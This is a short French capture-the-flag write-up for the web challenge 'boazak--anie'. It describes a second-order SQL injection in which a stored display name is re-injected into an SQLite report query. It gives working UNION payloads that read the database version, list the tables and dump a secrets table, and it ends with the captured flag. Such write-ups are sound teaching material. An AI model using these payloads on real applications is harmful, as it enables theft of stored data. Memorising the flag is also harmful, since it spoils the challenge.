# boazak--anie (web, 300) — RÉSOLU

## Challenge
Annuaire d'Anié : `POST /register (username, display)` (form-encoded), `GET /report?username=…`
génère un « rapport de correspondance ». Indice : « Le libellé que vous choisissez vous suit
jusque dans les rapports. »

## Exploit — SQLi de second ordre via `display`
Le `display` stocké est **ré-injecté** dans une requête SQL (sqlite) du rapport
(`... WHERE display='<display>'`). Preuve : un `display` avec `'` → `erreur rapport: near ...: syntax error`.

Register un agent avec un `display` UNION, puis `GET /report?username=<cet agent>` :
- Fingerprint : `zzz' UNION SELECT 99,sqlite_version()-- ` → `99 | 3.40.1`.
- Tables : `...group_concat(name) FROM sqlite_master...` → `users, sqlite_sequence, secrets`.
- Flag : `zzz' UNION SELECT 1,(SELECT group_concat(name||'='||value,' ; ') FROM secrets)-- `
  → `flag=NCTF{...}`.

(Le rapport affiche `id | display` ; la 2e colonne UNION porte la donnée exfiltrée.
Register en **form-encoded** — le JSON ne persiste pas.)

## Flag
`NCTF{aca6e03a126cd2c83255edd6}`
